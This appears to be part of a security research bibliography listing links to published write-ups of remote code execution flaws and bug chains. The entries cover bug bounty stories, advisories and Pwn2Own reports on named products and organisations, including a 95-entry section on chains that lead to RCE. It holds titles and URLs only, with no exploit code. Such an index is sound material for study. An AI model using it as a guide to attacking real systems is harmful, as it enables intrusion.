- [Iconv, Set The Charset To RCE: Exploiting The Glibc To Hack The PHP Engine (Part 2)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p2)
- [Iconv, Set The Charset To RCE: Exploiting The Glibc To Hack The PHP Engine (Part 1)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
- [Wikimedia/svgtranslate 2.0.1 Remote Code Execution](https://chocapikk.com/posts/2024/svgtranslate/)
- [LLM Pentest: Leveraging Agent Integration For RCE](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [I Love Lucee: Building Lucee Extensions for Remote Code Execution](https://www.sprocketsecurity.com/resources/building-lucee-extensions-for-remote-code-execution)
- [Exploiting embedded mitel phones for unauthenticated remote code execution](https://baldur.dk/blog/embedded-mitel-exploitation.html)
- [How I Hacked the Dutch Government: Exploiting an Innocent Image for Remote Code Execution](https://medium.com/@mukundbhuva/how-i-hacked-the-dutch-government-exploiting-an-innocent-image-for-remote-code-execution-df1fa936e46a)
- [Form Tools Remote Code Execution: We Need To Talk About PHP](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [How I got RCE in one of Bugcrowd's Public Programs](https://medium.com/@yousefmoh15/how-i-got-rce-in-one-of-bugcrowds-public-programs-5725c8dc46ce)
- [Jumpserver Preauth RCE Exploit Chain](https://sites.google.com/site/zhiniangpeng/blogs/Jumpserver)
- [Nokia vBMC — BMC Log Scanner Remote Code Execution](https://mattchew-gregory.medium.com/nokia-vbmc-bmc-log-scanner-remote-code-execution-52421b3f928d)
- [“MyFlaw” — Cross Platform 0-Day RCE Vulnerability Discovered in Opera’s Browser](https://labs.guard.io/myflaw-cross-platform-0-day-rce-vulnerability-discovered-in-operas-browsers-099361a808ab)
- [Mute the Sound: Chaining Vulnerabilities to Achieve RCE on Outlook: Pt 1](https://www.akamai.com/blog/security-research/2023/dec/chaining-vulnerabilities-to-achieve-rce-part-one)
- [Remote Code execution at ws1.aholdusa.com — Compromising logins of Ahold Delhaize USA employees for >3.5 years (or even 18 years?)](https://medium.com/@jonathanbouman/remote-code-execution-at-ws1-aholdusa-com-compromising-logins-of-ahold-delhaize-usa-employees-c7c9aca7e05d)
- [Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones](https://www.pentagrid.ch/en/blog/rce-and-local-root-in-openstage-and-openscape-phones/)
- [3 Symfony (RCE): A Peek Behind the Curtain](https://medium.com/@bxrowski0x/3-symfony-rce-a-peek-behind-the-curtain-83da5433e149)
- [SonicWall WXA – Authentication Bypass and Remote Code Execution Vulnerability](https://www.praetorian.com/blog/sonicwall-wxa-authentication-bypass-and-rce-vulnerability/)
- [Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol](https://blog.thalium.re/posts/achieving-remote-code-execution-in-steam-remote-play/)
- [Not Your Stdout Bug - RCE in Cosmos SDK](https://maxwelldulin.com/BlogPost/stdout-cosmos-sdk-rce)
- [Remote Code Execution in Tutanota Desktop due to Code Flaw](https://www.sonarsource.com/blog/remote-code-execution-in-tutanota-desktop-due-to-code-flaw/)
- [Fileless Remote Code Execution on Juniper Firewalls](https://vulncheck.com/blog/juniper-cve-2023-36845)
- [CraftCMS RCE](https://blog.calif.io/p/craftcms-rce)
- [Orbeon Forms: The Final Form? On A Journey To RCE](https://labs.watchtowr.com/orbeon-forms-the-final-form/)
- [Unveiling RCE on Dutch Government Website](https://medium.com/@nayeems3c/unveiling-rce-on-dutch-government-website-f001a1c5b4fb)
- [Apache Superset Part II: RCE, Credential Harvesting and More](https://www.horizon3.ai/apache-superset-part-ii-rce-credential-harvesting-and-more/)
- [From Terminal Output to Arbitrary Remote Code Execution](https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce)
- [How I got Two RCE at BBP Program @0xbartita](https://0xbartita.medium.com/how-i-got-two-rce-at-bbp-program-0xbartita-232727c5b3f0)
- [Huawei Theme Manager Arbitrary Code Execution](https://blog.doyensec.com/2023/07/26/huawei-theme-arbitrary-code-exec.html)
- [Executing Arbitrary Code & Executables in Read-Only FileSystems](https://labs.withsecure.com/publications/executing-arbitrary-code-executables-in-read-only-filesystems)
- [An interesting RCE on a Synack Red Team target!](https://d4ly.medium.com/an-interesting-rce-on-a-synack-red-team-target-516edb63fd04)
- [Critical Foswiki Vulnerablities: A Logic Error Turned Remote Code Execution](https://herolab.usd.de/en/critical-foswiki-vulnerablities-a-logic-error-turned-remote-code-execution/)
- [How I got Two RCE at EPAM-Bounty Program](https://web.archive.org/web/20230710001307/https://0xbartita.medium.com/how-i-got-two-rce-at-epam-bounty-program-389eb9fc7938)
- [From Blackbox .NET Remoting to Unauthenticated Remote Code Execution](https://code-white.com/blog/2023-07-from-blackbox-dotnet-remoting-to-rce/)
- [macOS Atlassian Companion Remote Code Execution](https://www.wojciechregula.blog/post/macos-atlassian-companion-rce/)
- [Story Of My First RCE :)](https://medium.com/@0utlawh4ck3r/story-of-my-first-rce-9d74373fbc11)
- [RCE via LDAP truncation on hg.mozilla.org](https://0day.click/recipe/pash/)
- [Exploring Three Remote Code Execution Vulnerabilities in RPC Runtime](https://www.akamai.com/blog/security-research/rpc-runtime-exploring-three-vulnerabilities)
- [Red team: Journey from RCE to have total control of cloud infrastructure](https://mr-r3bot.github.io/red/team/2023/05/22/From-RCE-to-owning-entire-cloud-infrastructure.html)
- [Hardcore RCE via directory name for $3.000](https://medium.com/@levshmelevv/hardcore-rce-via-directory-name-for-3-000-225ed58b41a9)
- [PwnAssistant - Controlling /home's Via A Home Assistant RCE](https://www.elttam.com/blog/pwnassistant/)
- [Exploiting an Order of Operations Bug to Achieve RCE in Oracle Opera](https://blog.assetnote.io/2023/04/30/rce-oracle-opera/)
- [Remote Code Execution Vulnerability in Google They Are Not Willing To Fix](https://giraffesecurity.dev/posts/google-remote-code-execution/)
- [How I got RCE in + 10 websites…](https://medium.com/@crd0x49/how-i-got-rce-in-10-websites-26dd87441f22)
- [From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
- [Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server](https://research.aurainfosec.io/pentest/pentah0wnage/)
- [CyberGhostVPN - the story of finding MITM, RCE, LPE in the Linux client](https://mmmds.pl/cyberghostvpn-mitm-rce-lpe/)
- [How I escalated default credentials to Remote Code Execution](https://pawanchhabria.medium.com/how-i-escalated-default-credentials-to-remote-code-execution-1c34504be7a5)
- [Backend Parameter Injection --> RCE](http://blog.sysdum.net/parameter-injection-to-rce)
- [Gitpod remote code execution 0-day vulnerability via WebSockets](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)
- [A New Vector For “Dirty” Arbitrary File Write to RCE](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [The Vulnerability That Exposed an UN Website to Remote Code Execution](https://medium.com/@mullangisashank/the-vulnerability-that-exposed-an-un-website-to-remote-code-execution-dfe377b82049)
- [$10.000 bounty for exposed .git to RCE](https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54)
- [How did I found RCE on SHAREit which rewarded $$$ bounty](https://infosecwriteups.com/how-did-i-found-rce-on-shareit-which-rewarded-bounty-7d4196bf1b52)
- [Unauthenticated RCE in Goanywhere](https://www.vicarius.io/vsociety/blog/unauthenticated-rce-in-goanywhere)
- [Apache SCXML Remote Code Execution](https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/)
- [WEEKEND DESTROYER - RCE in Western Digital PR4100 NAS](https://www.flashback.sh/blog/weekend-destroyer-wd-pr4100-rce)
- [RCE in Avaya Aura Device Services](https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/)
- [OpenEMR - Remote Code Execution in your Healthcare System](https://www.sonarsource.com/blog/openemr-remote-code-execution-in-your-healthcare-system/)
- [MyBB <= 1.8.31: Remote Code Execution Chain](https://swarm.ptsecurity.com/mybb-1-8-31-remote-code-execution-chain/)
- [Exploiting Hardcoded Keys to achieve RCE in Yellowfin BI](https://blog.assetnote.io/2023/01/24/yellowfin-auth-bypass-to-rce/)
- [Dissecting and Exploiting TCP/IP RCE Vulnerability “EvilESP”](https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/?)
- [EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.](https://ermetic.com/blog/azure/emojideploy-smile-your-azure-web-service-just-got-rced/)
- [2022 Microsoft Teams RCE](https://blog.pksecurity.io/2023/01/16/2022-microsoft-teams-rce.html)
- [YAFPC — Unauthenticated Remote Code Execution](https://blog.paradoxis.nl/yafpc-unauthenticated-remote-code-execution-755bf9e4d7c1)
- [Lexmark MC3224adwe RCE exploit](https://github.com/blasty/lexmark/blob/main/writeup/writeup.md)
- [PandoraFMS - Pre-Auth Remote Code Execution](https://3sjay.github.io/2023/01/06/pandoraFMS-Pre-Auth-RCE.html)
- [From PostAuth RCE to PreAuth RCE on Liferay Portal](https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from)
- [DataBinding2Shell: Novel Pathways to RCE Web Frameworks](https://www.blackhat.com/eu-22/briefings/schedule/#databindingshell-novel-pathways-to-rce-web-frameworks-28583)
- [Pre-Auth RCE with CodeQL in Under 20 Minutes](https://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html)
- [Control Your Types Or Get Pwned: Remote Code Execution In Exchange Powershell Backend](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend)
- [Remote Code Execution in Spotify’s Backstage via vm2 Sandbox Escape (CVSS Score of 9.8)](https://www.oxeye.io/blog/remote-code-execution-in-spotifys-backstage)
- [Checkmk: Remote Code Execution by Chaining Multiple Bugs (1/3)](https://blog.sonarsource.com/checkmk-rce-chain-1/)
- [Checkmk: Remote Code Execution by Chaining Multiple Bugs (2/3)](https://blog.sonarsource.com/checkmk-rce-chain-2/)
- [Checkmk: Remote Code Execution by Chaining Multiple Bugs (3/3)](https://blog.sonarsource.com/checkmk-rce-chain-3/)
- [Chaining Multiple Vulnerabilities Leads to Remote Code Execution (RCE) on One of the Payment Service Companies.](https://rohit-soni.medium.com/chaining-multiple-vulnerabilities-leads-to-remote-code-execution-rce-on-paytm-e77f2fd2295e)
- [Old RCE worth $3362.](https://medium.com/@nanwinata/old-rce-worth-3362-1af0cd70c459)
- [Eat What You Kill :: Pre-authenticated Remote Code Execution in VMWare NSX Manager](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html)
- [Potential Remote Code Execution Vulnerability Discovered In HSQLDB](https://www.code-intelligence.com/blog/potential-remote-code-execution-in-hsqldb)
- [Microsoft Office Online Server Remote Code Execution](https://www.mdsec.co.uk/2022/10/microsoft-office-online-server-remote-code-execution/)
- [Remote Code Execution in Melis Platform](https://blog.sonarsource.com/remote-code-execution-in-melis-platform/)
- [Basic recon to RCE III](https://www.jomar.fr/posts/2022/basic_recon_to_rce_iii/)
- [Analysis of a Remote Code Execution (RCE) Vulnerability in Cobalt Strike 4.7.1](https://securityintelligence.com/posts/analysis-rce-vulnerability-cobalt-strike/)
- [Pwn2Own Miami 2022: ICONICS GENESIS64 Arbitrary Code Execution](https://sector7.computest.nl/post/2022-10-iconics-genesis64/)
- [How Scanning Your Projects for Security Issues Can Lead to Remote Code Execution](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)
- [Pre-Auth Remote Code Execution - Web Page Test](https://thinkloveshare.com/hacking/preauth_remote_code_execution_web_page_test/)
- [Arbitrary File Corruption: End - to - End Encrypted Messaging Application](https://nmochea.medium.com/arbitrary-file-corruption-end-to-end-encrypted-messaging-application-674963dceef8)
- [How i Found Unauthorized Bypass RCE](https://medium.com/@yashshirke7806/how-i-found-unauthorized-bypass-rce-3591a86425a9)
- [LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function](https://arben.sh/research/LiveHelperChat-RCE/)
- [How I DIDN’T get an RCE in a $200 Billion company — Bug Bounty](https://medium.com/@nynan/how-i-didnt-get-an-rce-in-a-200-billion-company-bug-bounty-377afb2fb4ec)
- [Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution](https://sector7.computest.nl/post/2022-09-aveva-edge/)
- [Out-Of-Bond Remote code Execution(RCE) on De Nederlandsche Bank N.V. with burp-suite collaborator](https://infosecwriteups.com/out-of-bond-remote-code-execution-rce-on-de-nederlandsche-bank-n-v-with-burp-suite-collaborator-2ce50260e2e4)
- [Tetsuji: Remote Code Execution on a GameBoy Colour 22 Years Later](https://xcellerator.github.io/posts/tetsuji/)
- [SATisfying our way into remote code execution in the OPC UA industrial stack](https://jfrog.com/blog/satisfying-our-way-into-remote-code-execution-in-the-opc-ua-industrial-stack/)
- [Failed Coding Assessment to Remote Code Execution - Part 1](https://hackingguy.medium.com/failed-coding-assessment-to-remote-code-execution-a-case-study-part-1-1778934b3b34)
- [How I earned a $7000 bug bounty from Grab (RCE Unique Bugs)](https://web.archive.org/web/20220815093448/https://deb0con.medium.com/how-i-earned-a-7000-bug-bounty-from-grab-rce-unique-bugs-5e5037c5a58d)
- [From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize Operations Manager](https://srcincite.io/blog/2022/08/09/from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operations-manager.html)
- [From Shodan to RCE: That one time I hacked a Fortune 500 company.](https://systemweakness.com/rooting-jenkins-remote-code-execution-on-a-live-bug-bounty-target-fc2c12d89a2e)
- [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [Outdated PHP Version leads to RCE](https://medium.com/@iamdevansharya/outdated-php-version-leads-to-rce-380fb4db32f4)
- [Pwn2Own Miami 2022: Inductive Automation Remote Code Execution](https://sector7.computest.nl/post/2022-07-inductive-automation-ignition-rce/)
- [MyBB 0day Authenticated Remote code execution](https://0x1337.ninja/2022/07/19/mybb-0day-authenticated-remote-code-execution/)
- [How I found my first RCE!](https://infosecwriteups.com/how-i-found-my-first-rce-c063546114ef)
- [Ivanti EPM Remote Code Execution](https://machevalia.blog/blog/ivanti-epm-remote-code-execution)
- [Can analyzing javascript files lead to remote code execution?](https://melotover.medium.com/can-analyzing-javascript-files-lead-to-remote-code-execution-f24112f1aa1f)
- [Pwning Microsoft Azure Defender for IoT | Multiple Flaws Allow Remote Code Execution for All](https://www.sentinelone.com/labs/pwning-microsoft-azure-defender-for-iot-multiple-flaws-allow-remote-code-execution-for-all/)
- [Basic recon to RCE II](https://www.jomar.fr/posts/2022/basic_recon_to_rce_ii/)
- [Abusing Arbitrary File Deletes To Escalate Privilege And Other Great Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [RCE in GitHub Desktop < 2.9.4](https://github.com/Metnew/write-ups/tree/main/rce-github-desktop-2.9.3)
- [How i made 15k$ from Remote Code Execution Vulnerability](https://amakki.me/how-i-made-15k-from-remote-code-execution-vulnerability-2e1b14b3902a)
- [flashback_connects (Cisco RV340 SSL VPN Unauthenticated Remote Code Execution as root)](https://twitter.com/FlashbackPwn/status/1492074441450397698)
- [HigherLogic Community RCE Vulnerability](https://blog.sorcery.ie/posts/higherlogic_rce/)
- [The Story of a RCE on a Java Web Application](https://medium.com/@LIL__NIX/the-story-of-a-rce-on-a-java-web-application-2e400cddcd1e)
- [The Story of an RCE on a Java Web Application](https://infosecwriteups.com/the-story-of-a-rce-on-a-java-web-application-2e400cddcd1e)
- [The Tale of a Click leading to RCE](https://medium.com/manomano-tech/the-tale-of-a-click-leading-to-rce-8f68fe93545d)
- [Remote Code Execution in Google Cloud Dataflow](https://mbrancato.github.io/2021/12/28/rce-dataflow.html)
- [Bi/ug Bounties and HyperV RCE Research](https://rezer0dai.github.io/biug-bounties/)
- [RCE in Visual Studio Code's Remote WSL for Fun and Negative Profit](https://parsiya.net/blog/2021-12-20-rce-in-visual-studio-codes-remote-wsl-for-fun-and-negative-profit/)
- [Windows 10 RCE: The exploit is in the link](https://positive.security/blog/ms-officecmd-rce)
- [NodeBB 1.18.4 - Remote Code Execution With One Shot](https://blog.sonarsource.com/nodebb-remote-code-execution-with-one-shot)
- [This Microsoft Windows RCE Vulnerability Gives an Attacker Complete Control](https://www.synack.com/blog/this-microsoft-windows-rce-vulnerability-gives-an-attacker-complete-control/)
- [A Story of an Epic Blind Remote Code Execution(RCE)](https://www.p1boom.com/2021/11/a-story-of-epic-blind-remote-code.html)
- [Multiple Concrete CMS Vulnerabilities ( Part1 – RCE )](https://fortbridge.co.uk/research/multiple-vulnerabilities-in-concrete-cms-part1-rce/)
- [Discourse SNS webhook RCE](https://0day.click/recipe/discourse-sns-rce/)
- [Remote code execution in Managed Anthos Service Mesh control plane](https://lf.lc/vrp/203177829/)
- [From phpinfo page to many P1 bugs and RCE. [Symfony]](https://u-itachi.medium.com/from-phpinfo-page-to-many-p1-bugs-and-rce-symfony-bce432605662)
- [Anti-crawler Burp Suite RCE](https://web.archive.org/web/20211025081016/http://noahblog.360.cn/burp-suite-rce/)
- [Bug Bounty: “My Remote Code Execution”](https://0xjin.medium.com/bug-bounty-my-remote-code-execution-da7bbd00925a)
- [Pwn2Own Vancouver 2021 :: Microsoft Exchange Server Remote Code Execution](https://srcincite.io/blog/2021/08/25/pwn2own-vancouver-2021-microsoft-exchange-server-remote-code-execution.html)
- [Zoom RCE from Pwn2Own 2021](https://sector7.computest.nl/post/2021-08-zoom/)
- [How I got RCE In The World Largest Russian Company](https://infosecwriteups.com/how-i-got-rce-in-the-world-largest-russian-company-8e6e8288bc4e)
- [RCE via WebDav - Power Of PUT](https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60)
- [Counter-Strike Global Offsets: reliable remote code execution](https://secret.club/2021/05/13/source-engine-rce-join.html)
- [Exploiting the Source Engine (Part 2) - Full-Chain Client RCE in Source using Frida](https://ctf.re//source-engine/exploitation/2021/05/01/source-engine-2/)
- [Basic recon to RCE](https://www.jomar.fr/posts/2021/basic_recon_to_rce/)
- [Remote code execution in Homebrew by compromising the official Cask repository](https://blog.ryotak.me/post/homebrew-security-incident-en/)
- [Allow arbitrary URLs, expect arbitrary code execution](https://positive.security/blog/url-open-rce)
- [Vulnerability Spotlight: Multiple remote code execution vulnerabilities in Microsoft Azure Sphere](https://blog.talosintelligence.com/2021/04/vuln-spotlight-azure-sphere-april-2021.html)
- [Google Photos : Theft of Database & Arbitrary Files Android Vulnerability](https://servicenger.com/blog/mobile/google-photos-theft-of-database-arbitrary-files-android-vulnerability/)
- [RCE on Starbucks Singapore and more for $5600](http://www.kamilonurozkaleli.com/posts/rce-on-starbucks-singapore-and-more/)
- [TikTok for Android 1-Click RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)
- [Content Injection (RCE) in Yandex Browser for Android [2018]](https://wwws.nightwatchcybersecurity.com/2021/03/03/content-injection-rce-in-yandex-browser-for-android-2018/)
- [RCE On A Laravel Private Program](https://zdresearch.com/rce-on-a-laravel-private-program/)
- [SHAREit Flaw Could Lead to Remote Code Execution](https://www.trendmicro.com/en_us/research/21/b/shareit-flaw-could-lead-to-remote-code-execution.html)
- [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)
- [How we exploited a remote code execution vulnerability in math.js](https://jwlss.pw/mathjs/)
- [Github Secrets exposed due to RCE in Formatter Action from pull_request_target event](https://lf.lc/vrp/175896812/)
- [D-Link: Multiple Security Vulnerabilities Leading to RCE](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/d-link-multiple-security-vulnerabilities-leading-to-rce/)
- [OpenEMR 5.0.1.3 Arbitrary File Actions](https://jsecu.github.io/2020/11/17/openemr/)
- [Hacking into (RCE) Government Server operated for the US Department of Energy’s National Nuclear Security Administration.](https://medium.com/@shaheenfazim/hacking-into-rce-government-server-operated-for-the-us-department-of-energys-national-nuclear-8aadc2e7e491)
- [Silver Peak Unity Orchestrator RCE](https://medium.com/realmodelabs/silver-peak-unity-orchestrator-rce-2928d65ef749)
- [Remote code execution in import image task via storage bucket squatting](https://lf.lc/vrp/168987557/)
- [How a double-free bug in WhatsApp turns to RCE](https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/)
- [F5 Networks Endpoint Inspector – Browser-to-RCE?](https://www.pentestpartners.com/security-blog/f5-networks-endpoint-inspector-browser-to-rce/)
- [Universal RCE with Ruby YAML.load](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
- [How I got $4000 from Visma for RCE](https://medium.com/@ratnadip1998/how-i-got-4000-from-visma-for-rce-d541e6042086)
- [Manage Engine OpManager Multiple Authenticated RCE Vulnerabilities](https://pulsesecurity.co.nz/advisories/ManageEngine-OpManager-RCE)
- [Remote Code Execution in AT&T](https://corben.io/blog/17-3-10-att-rce)
- [GitHub RCE Writeup](https://0day.click/recipe/2014-02-22-github/)

### 2.6 Chain bibliography: another class → RCE (originator named in title)

95 entries.

- [Cookie Tossing to RCE on Google Cloud JupyterLab](https://blog.s1r1us.ninja/bug-bounty/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks)
- [RCE via LFI Log Poisoning - The Death Potion](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
- [Leveraging LFI to RCE in a website with +20000 users](https://medium.com/bugbountywriteup/leveraging-lfi-to-rce-in-a-website-with-20000-users-129050f9982b)
- [Write Up – Google Bug Bounty: XSS To Cloud Shell Instance Takeover (Rce As Root) – $5,000 USD](https://omespino.com/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/)
- [SQL Injection & Remote Code Execution - Double P1](https://medium.com/@shahjerry33/sql-injection-remote-code-execution-double-p1-6038ca88a2ec)
- [How_i_was_able_to_pawned_website_via_escilating_webcache deception to rce](https://tox7cv3nom.github.io/2020-08-05-how_i_was_able_to_pawned_website_via_escilating_webcache-deception-to-rce/)
- [Django debug mode to RCE in Microsoft acquisition](https://medium.com/@syedabuthahir/django-debug-mode-to-rce-in-microsoft-acquisition-189d27d08971)
- [Open Sesame: Escalating Open Redirect to RCE with Electron Code Review](https://spaceraccoon.dev/open-sesame-escalating-open-redirect-to-rce-with-electron-code-review?pk_campaign=rss-feed)
- [XSS, RCE & HTML File Upload in same endpoint](https://medium.com/@sa1tama0/xss-rce-html-file-upload-in-same-endpoint-4a03348445f4)
- [Guest Blog: From File Upload to RCE](https://www.synack.com/blog/guest-blog-from-file-upload-to-rce/)
- [ManageEngine ServiceDesk Plus: Arbitrary File Upload](https://medium.com/@ducanhbui/manageengine-servicedesk-plus-arbitrary-file-upload-4bab0bd00425)
- [How I Gain Unrestricted File Upload Remote Code Execution Bug Bounty](https://medium.com/@shayboy123/how-i-gain-unrestricted-file-upload-remote-code-execution-bug-bounty-381d0aab0dad)
- [Microsoft Edge (Chromium) - EoP via XSS to Potential RCE](https://leucosite.com/Edge-Chromium-EoP-RCE/)
- [[Bug Bounty] Exploiting Cookie Based XSS by Finding RCE](https://pwn.vg/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce)
- [Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)](https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3)
- [Exploiting File Uploads Pt. 2 – A Tale of a $3k worth RCE.](https://anotherhackerblog.com/exploiting-file-uploads-pt-2/)
- [RCE using Path Traversal](https://incogbyte.github.io/pathtraversal/)
- [XSS to RCE in …](https://medium.com/@hungrybytes/xss-to-rce-in-e20b2bc55f94)
- [Chaining multiple low-impact bugs to arbitrary file read in GitLab](https://blog.nyangawa.me/security/GitLab-Local-File-Read/)
- [PDFReacter SSRF to ROOT Level Local File Read which led to RCE](https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129)
- [WordPress 5.1 CSRF to Remote Code Execution](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/)
- [Escalating SSRF to RCE](https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9)
- [Remote Code Execution via Path Traversal in the Device Metadata Authoring Wizard](https://posts.specterops.io/remote-code-execution-via-path-traversal-in-the-device-metadata-authoring-wizard-a0d5839fc54f)
- [Magento – RCE & Local File Read with low privilege admin rights](https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/)
- [Path traversal while uploading results in RCE](https://blog.harshjaiswal.com/path-traversal-while-uploading-results-in-rce)
- [Arbitrary File Read in one of the largest CRMs](https://medium.com/@mantissts/arbitrary-file-read-in-one-of-the-largest-crms-658caa2f05d2)
- [Chain The Bugs to Pwn an Organisation ( LFI + Unrestricted File Upload = Remote Code Execution )](https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce)
- [#BugBounty — ”Journey from LFI to RCE!!!”-How I was able to get the same in one of the India’s popular property buy/sell company.](https://medium.com/@logicbomb_1/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
- [Unrestricted File Upload to RCE | Bug Bounty POC](https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/)
- [Taking note: XSS to RCE in the Simplenote Electron client](https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/)
- [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
- [ How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! ](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Pivoting from blind SSRF to RCE with HashiCorp Consul](http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)
- [Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS)](https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/)
- [Waze arbitrary file upload](http://blog.shashank.co/2013/12/waze-arbitrary-file-upload.html)
- [Analysis of CVE-2024-43044 — From file read to RCE in Jenkins through agents](https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/)
- [$15k RCE Through Monitoring Debug Mode](https://medium.com/@0xold/15k-rce-through-monitoring-debug-mode-4f474d8549d5)
- [SSD Advisory – XenForo RCE Via CSRF](https://ssd-disclosure.com/ssd-advisory-xenforo-rce-via-csrf/)
- [SSD Advisory – SonicWall SMA100 Stored XSS To RCE](https://ssd-disclosure.com/ssd-advisory-sonicwall-sma100-stored-xss-to-rce/)
- [Brand-new prototype pollution gadget in MongoDB leading to RCE](https://infosecwriteups.com/brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e)
- [ZSATrayManager Arbitrary File Deletion (CVE-2023-41969)](https://medium.com/csg-govtech/catch-me-if-you-can-local-privilege-escalation-in-zscaler-client-connector-7ad997bd7058)
- [Hacking Apple - SQL Injection to Remote Code Execution](https://blog.projectdiscovery.io/hacking-apple-with-sql-injection/)
- [Blog: OmniSpace, from automated 0day XSS to RCE](https://preprod.patrowl.io/blog-omnispace-from-automated-xss-to-rce-cve-2023-40228/)
- [ZeroQlik: Achieving Unauthenticated Remote Code Execution via HTTP Request Tunneling and Path Traversal](https://www.praetorian.com/blog/qlik-sense-technical-exploit/)
- [Dependency Confusion Attack: A Route to RCE](https://sklnhunt.github.io/posts/dependencyconfusion/)
- [RCE via Account Takeover](https://medium.com/vault-infosec/rce-via-account-takeover-a6fea7390385)
- [Authenticated Arbitrary File Download (Path Traversal)](https://research.aurainfosec.io/disclosure/papercut/)
- [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
- [CVE-2023-36934: Progress Software MOVEit Transfer SQL Injection Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/blog/2023/7/19/cve-2023-36934-progress-software-moveit-transfer-sql-injection-remote-code-execution-vulnerability)
- [My First Bug is RCE via SQL injection!](https://medium.com/@karimelsayed0x1/my-first-bug-is-rce-via-sql-injection-dfee9c4d4c01)
- [RCE via Path Traversal vulnerability in Onlyoffice CommunityServer < 12.5.2 (CVE-2023-34939)](https://github.com/firsov/onlyoffice/blob/main/CVE-2023-34939-PoC.md)
- [RCE due to Dependency Confusion — $5000 bounty!](https://chevonphillip.medium.com/rce-due-to-dependency-confusion-5000-bounty-fd1b294d645f)
- [Super FabriXss: From XSS to an RCE in Azure Service Fabric Explorer by Abusing an Event Tab Cluster Toggle (CVE-2023-23383)](https://orca.security/resources/blog/super-fabrixss-azure-vulnerability/)
- [EJS - Server Side Prototype Pollution gadgets to RCE](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
- [From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)
- [SSD Advisory – Cisco Secure Manager Appliance remediation_request_utils SQL Injection Remote Code Execution](https://ssd-disclosure.com/ssd-advisory-cisco-secure-manager-appliance-remediation_request_utils-sql-injection-remote-code-execution/)
